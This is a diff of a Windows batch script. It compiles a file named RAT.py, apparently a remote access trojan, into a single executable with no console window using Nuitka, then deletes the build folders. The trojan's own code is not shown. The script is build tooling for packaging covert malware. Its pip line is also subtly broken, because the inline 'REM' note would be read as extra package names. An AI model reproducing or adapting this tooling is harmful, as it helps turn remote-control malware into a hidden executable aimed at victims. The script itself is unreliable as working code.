@@ -1,10 +1,19 @@
-echo off
+@echo off
+if not exist RAT.py (
+    echo RAT.py not found. Please place it in this directory.
+    pause
+    exit /b 1
+)
+REM Install/upgrade Nuitka if needed
+python -m pip install --upgrade pip
+python -m pip install nuitka REM Optional note: Use conda for lab env if pip fails
 
-pyinstaller --clean --hidden-import=pyttsx3.drivers --hidden-import=pyttsx3.drivers.sapi5 --onefile --noconsole RAT.py
+REM Compile RAT.py
+python -m nuitka --onefile --enable-plugin=tk-inter --windows-console-mode=disable --include-module=pyttsx3.drivers.sapi5 RAT.py
 
-del /s /q /f RAT.spec
+REM Cleanup
+del /s /q /f RAT.py.build
 rmdir /s /q __pycache__
-rmdir /s /q build
+rmdir /s /q .build .onefile-build
 
-:cmd
-pause null
+pause
